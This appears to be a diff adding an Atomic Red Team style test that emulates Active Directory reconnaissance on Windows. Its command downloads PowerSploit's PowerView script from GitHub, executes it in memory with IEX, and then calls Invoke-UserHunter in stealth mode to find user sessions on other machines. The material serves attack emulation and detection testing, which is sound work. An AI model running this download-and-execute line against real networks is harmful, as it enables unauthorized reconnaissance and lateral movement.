@@ -51,3 +51,15 @@ atomic_tests:
       users
       w
       who
+
+- name: Find computers where user has session - Stealth mode (PowerView)
+  auto_generated_guid: 29857f27-a36f-4f7e-8084-4557cd6207ca
+  description:
+    Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Invoke-UserHunter -Stealth -Verbose
